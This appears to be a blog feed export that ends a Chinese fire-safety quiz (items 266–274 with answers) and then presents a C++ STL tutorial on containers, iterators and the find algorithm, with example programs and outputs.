<p>​     266、[单选题]<strong>身上着火后,下列哪种灭火方法是错误的？</strong> （分值1.0）</p>
<ul>
<li>A、就地打滚<br> B、用厚重衣物覆盖压灭火苗<br> C、迎风快跑<br> D、大量水冲或跳入水中</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     267、[单选题]<strong>火灾中对人员威胁最大的是（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、火<br> B、烟气<br> C、可燃物</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     268、[单选题]<strong>按照国家工程建筑消防技术标准施工的项目竣工时，（ ）经公安消防机构进行消防验收。</strong> （分值1.0）</p>
<ul>
<li>A、必须<br> B、可以<br> C、应当</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     269、[单选题]<strong>公安消防人员在灭火过程中，应当（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、优先救人<br> B、优先抢救财物<br> C、优先灭火 </li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     270、[单选题]<strong>如果睡觉时被烟火呛醒，正确的做法是（）。</strong> （分值1.0）</p>
<ul>
<li>A、寻找逃生通道<br> B、往床底下钻<br> C、找衣服穿或抢救心爱的东西</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     271、[单选题]<strong>实验室仪器设备用电或线路发生故障着火时，应立即（ ），并组织人员用灭火器进行灭火。</strong> （分值1.0）</p>
<ul>
<li>A、将贵重仪器设备迅速转移<br> B、切断现场电源<br> C、将人员疏散</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     272、[单选题]<strong>使用灭火器扑救火灾时要对准火焰的什么部位喷射。</strong> （分值1.0）</p>
<ul>
<li>A、上部<br> B、中部<br> C、根部<br> D、中上部</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     273、[单选题]<strong>公共场所安全出口的疏散门应（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、双向开启<br> B、向外开启<br> C、向内开启 </li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     274、[单选题]<strong>公安消防队救火（）</strong> （分值1.0）</p>
<ul>
<li>A、只收救火成本费<br> B、收取所有费用<br> C、不收任何费用</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>C++ STL（标准模板库）</title>
    <url>/2020/10/30/STL/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>本文仅为个人学习使用，非原创来源如下：<a href="http://c.biancheng.net/cplus/80/">C语言中文网</a></p>
<p>C++ 语言的核心优势之一就是便于软件的重用。C++ 中有两个方面体现重用：</p>
<ul>
<li>一是面向对象的继承和多态机制；</li>
<li>二是通过模板的概念实现了对泛型程序设计的支持。</li>
</ul>
<p>C++ 的标准模板库（Standard Template Library，STL）是泛型程序设计最成功应用的实例。STL 是一些常用数据结构（如链表、可变长数组、排序二叉树）和算法（如排序、查找）的模板的集合，主要由 Alex Stepanov 主持开发，于 1998 年被加入 C++ 标准。</p>
<p>有了 STL，程序员就不必编写大多数常用的数据结构和算法。而且 STL 是经过精心设计的，运行效率很高，比水平一般的程序员编写的同类代码速度更快。</p>
<p>有一种说法，C++ 是用来编写大程序的，如果只是编写几十上百行的小程序，用C语言就可以，没有必要用 C++。</p>
<p>这个说法是不准确的。可以说，写小程序没必要用面向对象的方法，但是用 C++ 还是能够带来很大方便的，因为 C++ 中有 STL。哪怕编写只有十几行的程序，也可能会用到 STL 中提供的数据结构和算法。例如对数组排序，用 STL 中的 sort 算法往往只需要一条语句就能解决，而不用像调用C语言库函数 qsort 那样还要编写比较函数。</p>
<a id="more"></a>

<h4 id="C-容器（STL容器）"><a href="#C-容器（STL容器）" class="headerlink" title="C++容器（STL容器）"></a>C++容器（STL容器）</h4><p>容器（container）用于存放数据的类模板。可变长数组、链表、平衡二叉树等<a href="http://c.biancheng.net/data_structure/">数据结构</a>在 <a href="http://c.biancheng.net/stl/">STL</a> 中都被实现为容器。</p>
<p>程序员使用容器时，即将容器类模板实例化为容器类时，会指明容器中存放的元素是什么类型的。</p>
<p>容器中可以存放基本类型的变量，也可以存放对象。对象或基本类型的变量被插入容器中时，实际插入的是对象或变量的一个复制品。</p>
<p>STL 中的许多算法（即函数模板），如排序、查找等算法，在执行过程中会对容器中的元素进行比较。这些算法在比较元素是否相等时通常用运算符进行，比较大小通常用<code>&lt;</code>运算符进行，因此，被放入容器的对象所属的类最好重载<code>==</code>和<code>&lt;</code>运算符，以使得两个对象用<code>==</code>和<code>&lt;</code>进行比较是有定义的。</p>
<p>容器分为两大类。</p>
<p><strong>顺序容器</strong></p>
<p>顺序容器有以下三种：可变长动态数组 vector、双端队列 deque、双向链表 list。</p>
<p>它们之所以被称为顺序容器，是因为元素在容器中的位置同元素的值无关，即容器不是排序的。将元素插入容器时，指定在什么位置（尾部、头部或中间某处）插入，元素就会位于什么位置。</p>
<p><strong>关联容器</strong></p>
<p>关联容器有以下四种：set、multiset、map、multimap。关联容器内的元素是排序的。插入元素时，容器会按一定的排序规则将元素放到适当的位置上，因此插入元素时不能指定位置。</p>
<p>默认情况下，关联容器中的元素是从小到大排序（或按关键字从小到大排序）的，而且用<code>&lt;</code>运算符比较元素或关键字大小。因为是排好序的，所以关联容器在查找时具有非常好的性能。</p>
<p>除了以上两类容器外，STL 还在两类容器的基础上屏蔽一部分功能，突出或增加另一部分功能，实现了三种容器适配器：栈 stack、队列 queue、优先级队列 priority_queue。</p>
<p>为称呼方便起见，本教程后面将容器和容器适配器统称为容器。</p>
<p>容器都是类模板。它们实例化后就成为容器类。用容器类定义的对象称为容器对象。</p>
<p>例如，<code>vector&lt;int&gt;</code>是一个容器类的名字，<code>vector&lt;int&gt; a;</code>就定义了一个容器对象 a，a 代表一个长度可变的数组，数组中的每个元素都是 int 类型的变量；<code>vector&lt;double&gt; b;</code>定义了另一个容器对象 b，a 和 b 的类型是不同的。本教程后文所说的“容器”，有时也指“容器对象”，读者需要根据上下文自行判别。</p>
<p>任何两个容器对象，只要它们的类型相同，就可以用 &lt;、&lt;=、&gt;、&gt;=、==、!= 进行词典式的比较运算。假设 a、b 是两个类型相同的容器对象，这些运算符的运算规则如下。</p>
<ul>
<li>a == b：若 a 和 b 中的元素个数相同，且对应元素均相等，则<code>a == b</code>的值为 true，否则值为 false。元素是否相等是用<code>==</code>运算符进行判断的。</li>
<li>a&lt;b：规则类似于词典中两个单词比较大小，从头到尾依次比较每个元素，如果发生 a 中的元素小于 b 中的元素的情况，则<code>a&lt;b</code>的值为 true；如果没有发生 b 中的元素小于 a 中的元素的情况，且 a 中的元素个数比 b 少，<code>a&lt;b</code>的值也为 true；其他情况下值为 false。元素比较大小是通过<code>&lt;</code>运算符进行的。</li>
<li>a != b：等价于 !(a == b)。</li>
<li>a &gt; b：等价于 b &lt; a。</li>
<li>a &lt;= b：等价于 !(b &lt; a)。</li>
<li>a &gt;= b：等价于 !(a &lt; b)。</li>
</ul>
<p>所有容器都有以下两个成员函数：</p>
<ul>
<li>int size()：返回容器对象中元素的个数。</li>
<li>bool empty()：判断容器对象是否为空。</li>
</ul>
<p>顺序容器和关联容器还有以下成员函数：</p>
<ul>
<li>begin()：返回指向容器中第一个元素的迭代器。</li>
<li>end()：返回指向容器中最后一个元素后面的位置的迭代器。</li>
<li>rbegin()：返回指向容器中最后一个元素的反向迭代器。</li>
<li>rend()：返回指向容器中第一个元素前面的位置的反向迭代器。</li>
<li>erase(…)：从容器中删除一个或几个元素。该函数参数较复杂，此处省略。</li>
<li>clear()：从容器中删除所有元素。</li>
</ul>
<p>如果一个容器是空的，则 begin() 和 end() 的返回值相等，rbegin() 和 rend() 的返回值也相等。</p>
<p>顺序容器还有以下常用成员函数：</p>
<ul>
<li>front()：返回容器中第一个元素的引用。</li>
<li>back()：返回容器中最后一个元素的引用。</li>
<li>push_back()：在容器末尾增加新元素。</li>
<li>pop_back()：删除容器末尾的元素。</li>
<li>insert(…)：插入一个或多个元素。该函数参数较复杂，此处省略。</li>
</ul>
<h4 id="C-迭代器（STL迭代器）iterator详解"><a href="#C-迭代器（STL迭代器）iterator详解" class="headerlink" title="C++迭代器（STL迭代器）iterator详解"></a>C++迭代器（STL迭代器）iterator详解</h4><p>要访问顺序容器和关联容器中的元素，需要通过“迭代器（iterator）”进行。迭代器是一个变量，相当于容器和操纵容器的算法之间的中介。迭代器可以指向容器中的某个元素，通过迭代器就可以读写它指向的元素。从这一点上看，迭代器和<a href="http://c.biancheng.net/c/80/">指针</a>类似。</p>
<p>迭代器按照定义方式分成以下四种。</p>
<ol>
<li>正向迭代器，定义方法如下：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::iterator 迭代器名;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>常量正向迭代器，定义方法如下：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::const_iterator 迭代器名;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>反向迭代器，定义方法如下：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>常量反向迭代器，定义方法如下：</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::const_reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure>

<p><strong>迭代器用法示例</strong></p>
<p>通过迭代器可以读取它指向的元素，<code>*迭代器名</code>就表示迭代器指向的元素。通过非常量迭代器还能修改其指向的元素。</p>
<p>迭代器都可以进行<code>++</code>操作。反向迭代器和正向迭代器的区别在于：</p>
<ul>
<li>对正向迭代器进行<code>++</code>操作时，迭代器会指向容器中的后一个元素；</li>
<li>而对反向迭代器进行<code>++</code>操作时，迭代器会指向容器中的前一个元素。</li>
</ul>
<p>下面的程序演示了如何通过迭代器遍历一个 vector 容器中的所有元素。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;  <span class="comment">//v是存放int类型变量的可变长数组，开始时没有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; n&lt;<span class="number">5</span>; ++n)</span><br><span class="line">        v.push_back(n);  <span class="comment">//push_back成员函数在vector容器尾部添加一个元素</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator i;  <span class="comment">//定义正向迭代器</span></span><br><span class="line">    <span class="keyword">for</span> (i = v.begin(); i != v.end(); ++i) &#123;  <span class="comment">//用迭代器遍历容器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;  <span class="comment">//*i 就是迭代器i指向的元素</span></span><br><span class="line">        *i *= <span class="number">2</span>;  <span class="comment">//每个元素变为原来的2倍</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//用反向迭代器遍历容器</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::reverse_iterator j = v.rbegin(); j != v.rend(); ++j)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *j &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：<br>0 1 2 3 4<br>8 6 4 2 0</p>
<p>第 6 行，vector 容器有多个构造函数，如果用无参构造函数初始化，则容器一开始是空的。</p>
<p>第 10 行，begin 成员函数返回指向容器中第一个元素的迭代器。++i 使得 i 指向容器中的下一个元素。end 成员函数返回的不是指向最后一个元素的迭代器，而是指向最后一个元素后面的位置的迭代器，因此循环的终止条件是<code>i != v.end()</code>。</p>
<p>第 16 行定义了反向迭代器用以遍历容器。反向迭代器进行<code>++</code>操作后，会指向容器中的上一个元素。rbegin 成员函数返回指向容器中最后一个元素的迭代器，rend 成员函数返回指向容器中第一个元素前面的位置的迭代器，因此本循环实际上是从后往前遍历整个数组。</p>
<p>如果迭代器指向了容器中最后一个元素的后面或第一个元素的前面，再通过该迭代器访问元素，就有可能导致程序崩溃，这和访问 NULL 或未初始化的指针指向的地方类似。</p>
<p>第 10 行和第 16 行，写<code>++i</code>、<code>++j</code>相比于写<code>i++</code>、<code>j++</code>，程序的执行速度更快。回顾<code>++</code>被重载成前置和后置运算符的例子如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CDemo CDemo::<span class="keyword">operator</span>++ ()</span><br><span class="line">&#123;  <span class="comment">//前置++</span></span><br><span class="line">    ++n;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">CDemo CDemo::<span class="keyword">operator</span> ++(<span class="keyword">int</span> k)</span><br><span class="line">&#123;  <span class="comment">//后置++</span></span><br><span class="line">    <span class="function">CDemo <span class="title">tmp</span><span class="params">(*<span class="keyword">this</span>)</span></span>;  <span class="comment">//记录修改前的对象</span></span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">return</span> tmp;  <span class="comment">//返回修改前的对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后置<code>++</code>要多生成一个局部对象 tmp，因此执行速度比前置的慢。同理，迭代器是一个对象，<a href="http://c.biancheng.net/stl/">STL</a> 在重载迭代器的<code>++</code>运算符时，后置形式也比前置形式慢。在次数很多的循环中，<code>++i</code>和<code>i++</code>可能就会造成运行时间上可观的差别了。因此，本教程在前面特别提到，对循环控制变量i，要养成写<code>++i</code>、不写<code>i++</code>的习惯。</p>
<p>注意，容器适配器 stack、queue 和 priority_queue 没有迭代器。容器适配器有一些成员函数，可以用来对元素进行访问。</p>
<p><strong>迭代器的功能分类</strong></p>
<p>不同容器的迭代器，其功能强弱有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。例如，排序算法需要通过随机访问迭代器来访问容器中的元素，因此有的容器就不支持排序算法。</p>
<p>常用的迭代器按功能强弱分为输入、输出、正向、双向、随机访问五种，这里只介绍常用的三种。</p>
<ol>
<li><p>正向迭代器。假设 p 是一个正向迭代器，则 p 支持以下操作：++p，p++，*p。此外，两个正向迭代器可以互相赋值，还可以用<code>==</code>和<code>!=</code>运算符进行比较。</p>
</li>
<li><p>双向迭代器。双向迭代器具有正向迭代器的全部功能。除此之外，若 p 是一个双向迭代器，则<code>--p</code>和<code>p--</code>都是有定义的。<code>--p</code>使得 p 朝和<code>++p</code>相反的方向移动。</p>
</li>
<li><p>随机访问迭代器。随机访问迭代器具有双向迭代器的全部功能。若 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p>
</li>
</ol>
<ul>
<li>p+=i：使得 p 往后移动 i 个元素。</li>
<li>p-=i：使得 p 往前移动 i 个元素。</li>
<li>p+i：返回 p 后面第 i 个元素的迭代器。</li>
<li>p-i：返回 p 前面第 i 个元素的迭代器。</li>
<li>p[i]：返回 p 后面第 i 个元素的引用。</li>
</ul>
<p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;=、&gt;= 运算符进行比较。<code>p1&lt;p2</code>的含义是：p1 经过若干次（至少一次）<code>++</code>操作后，就会等于 p2。其他比较方式的含义与此类似。</p>
<p>对于两个随机访问迭代器 p1、p2，表达式<code>p2-p1</code>也是有定义的，其返回值是 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。</p>
<p>表1所示为不同容器的迭代器的功能。</p>
<table>
<thead>
<tr>
<th>容器</th>
<th>迭代器功能</th>
</tr>
</thead>
<tbody><tr>
<td>vector</td>
<td>随机访问</td>
</tr>
<tr>
<td>deque</td>
<td>随机访问</td>
</tr>
<tr>
<td>list</td>
<td>双向</td>
</tr>
<tr>
<td>set / multiset</td>
<td>双向</td>
</tr>
<tr>
<td>map / multimap</td>
<td>双向</td>
</tr>
<tr>
<td>stack</td>
<td>不支持迭代器</td>
</tr>
<tr>
<td>queue</td>
<td>不支持迭代器</td>
</tr>
<tr>
<td>priority_queue</td>
<td>不支持迭代器</td>
</tr>
</tbody></table>
<p>例如，vector 的迭代器是随机迭代器，因此遍历 vector 容器有以下几种做法。下面的程序中，每个循环演示了一种做法。</p>
<p>【实例】遍历 vector 容器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">100</span>)</span></span>; <span class="comment">//v被初始化成有100个元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; v.size() ; ++i) <span class="comment">//size返回元素个数</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; v[i]; <span class="comment">//像普通数组一样使用vector容器</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator i;</span><br><span class="line">    <span class="keyword">for</span>(i = v.begin(); i != v.end (); ++i) <span class="comment">//用 != 比较两个迭代器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">    <span class="keyword">for</span>(i = v.begin(); i &lt; v.end ();++i) <span class="comment">//用 &lt; 比较两个迭代器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">    i = v.begin();</span><br><span class="line">    <span class="keyword">while</span>(i &lt; v.end()) &#123; <span class="comment">//间隔一个输出</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * i;</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 随机访问迭代器支持 &quot;+= 整数&quot;  的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>list 容器的迭代器是双向迭代器。假设 v 和 i 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::const_iterator i;</span><br></pre></td></tr></table></figure>

<p>则以下代码是合法的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=v.begin(); i!=v.end(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; *i;</span><br></pre></td></tr></table></figure>

<p>以下代码则不合法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=v.begin(); i&lt;v.end(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; *i;</span><br></pre></td></tr></table></figure>

<p>因为双向迭代器不支持用“&lt;”进行比较。以下代码也不合法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;v.size(); ++i)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v[i];</span><br></pre></td></tr></table></figure>

<p>因为 list 不支持随机访问迭代器的容器，也不支持用下标随机访问其元素。</p>
<p>在 <a href="http://c.biancheng.net/cplus/">C++</a> 中，数组也是容器。数组的迭代器就是指针，而且是随机访问迭代器。例如，对于数组 int a[10]，int * 类型的指针就是其迭代器。则 a、a+1、a+2 都是 a 的迭代器。</p>
<p><strong>迭代器的辅助函数</strong></p>
<p>STL 中有用于操作迭代器的三个函数模板，它们是：</p>
<ul>
<li>advance(p, n)：使迭代器 p 向前或向后移动 n 个元素。</li>
<li>dis<a href="http://c.biancheng.net/ref/tan.html">tan</a>ce(p, q)：计算两个迭代器之间的距离，即迭代器 p 经过多少次 + + 操作后和迭代器 q 相等。如果调用时 p 已经指向 q 的后面，则这个函数会陷入死循环。</li>
<li>iter_swap(p, q)：用于交换两个迭代器 p、q 指向的值。</li>
</ul>
<p>要使用上述模板，需要包含头文件 algorithm。下面的程序演示了这三个函数模板的 用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; //要使用操作迭代器的函数模板，需要包含此文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">    <span class="built_in">list</span> &lt;<span class="keyword">int</span>&gt; lst(a, a+<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">list</span> &lt;<span class="keyword">int</span>&gt;::iterator p = lst.begin();</span><br><span class="line">    advance(p, <span class="number">2</span>);  <span class="comment">//p向后移动两个元素，指向3</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 1)3</span></span><br><span class="line">    advance(p, <span class="number">-1</span>);  <span class="comment">//p向前移动一个元素，指向2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 2)2</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator q = lst.end();</span><br><span class="line">    q--;  <span class="comment">//q 指向 5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span> &lt;&lt; distance(p, q) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 3)3</span></span><br><span class="line">    iter_swap(p, q); <span class="comment">//交换 2 和 5</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (p = lst.begin(); p != lst.end(); ++p)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：</p>
<ol>
<li>3</li>
<li>2</li>
<li>3</li>
<li>1 5 3 4 2</li>
</ol>
<h4 id="STL算法详解"><a href="#STL算法详解" class="headerlink" title="STL算法详解"></a>STL算法详解</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 提供能在各种容器中通用的算法（大约有70种），如插入、删除、查找、排序等。算法就是函数模板。算法通过迭代器来操纵容器中的元素。</p>
<p>许多算法操作的是容器上的一个区间（也可以是整个容器），因此需要两个参数，一个是区间起点元素的迭代器，另一个是区间终点元素的后面一个元素的迭代器。例如，排序和查找算法都需要这两个参数来指明待排序或待查找的区间。</p>
<p>有的算法返回一个迭代器。例如，find 算法在容器中查找一个元素，并返回一个指向该元素的迭代器。</p>
<p>算法可以处理容器，也可以处理普通的数组。</p>
<p>有的算法会改变其所作用的容器。例如：</p>
<ul>
<li>copy：将一个容器的内容复制到另一个容器。</li>
<li>remove：在容器中删除一个元素。</li>
<li>random_shuffle：随机打乱容器中的元素。</li>
<li>fill：用某个值填充容器。</li>
</ul>
<p>有的算法不会改变其所作用的容器。例如：</p>
<ul>
<li>find：在容器中查找元素。</li>
<li>count_if：统计容器中符合某种条件的元素的个数。</li>
</ul>
<p>STL 中的大部分常用算法都在头文件 algorithm 中定义。此外，头文件 numeric 中也有一些算法。</p>
<p>下面介绍一个常用算法 find，以便对算法是什么、怎么用有一个基本的概念。find 算法和其他算法一样都是函数模板。find 模板的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">InIt</span> <span class="title">find</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">InIt</span> <span class="title">last</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">val</span>);</span></span><br></pre></td></tr></table></figure>

<p>其功能可以是在迭代器 first、last 指定的容器的一个区间 [first, last) 中，按顺序查找和 val 相等的元素。如果找到，就返回该元素的迭代器；如果找不到，就返回 last。</p>
<blockquote>
<p>[first, last) 这个区间是一个左闭右开的区间，即 last 指向的元素其实不在此区间内。</p>
</blockquote>
<p>find 模板使用<code>==</code>运算符判断元素是否相等。因此，如果 [first, last) 区间中存放的是对象，则<code>==</code>运算符应该被适当重载，使得两个对象可以用<code>==</code>运算符比较。</p>
<p>注意：上一段话说的是“其功能可以是”，而不是“其功能就是”。这是因为模板只是一种代码形式，这种代码形式具体能完成什么功能，取决于程序员对该模板写法的了解及其想象力。按照语法，调用 find 模板时，first 和 last 只要类型相同就可以，不一定必须是迭代器。</p>
<p>演示 find 用法的程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">    v.push_back(<span class="number">1</span>);    v.push_back(<span class="number">2</span>);</span><br><span class="line">    v.push_back(<span class="number">3</span>);    v.push_back(<span class="number">4</span>); <span class="comment">//此后v里放着4个元素：1,2,3,4</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator p;</span><br><span class="line">    p = find(v.begin(),v.end(),<span class="number">3</span>); <span class="comment">//在v中查找3</span></span><br><span class="line">    <span class="keyword">if</span>(p != v.end()) <span class="comment">//若找不到,find返回 v.end()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt;  * p &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//找到了</span></span><br><span class="line">    p = find(v.begin(),v.end(),<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span>(p == v.end())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found &quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//没找到</span></span><br><span class="line">    p = find(v.begin()+<span class="number">1</span>,v.end()<span class="number">-1</span>,<span class="number">4</span>); <span class="comment">//在,3 这两个元素中查找4</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; * p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> * pp = find(a,a+<span class="number">4</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span>(pp == a + <span class="number">4</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt;* pp &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：</p>
<ol>
<li>3<br>not found</li>
<li>4</li>
<li>20</li>
</ol>
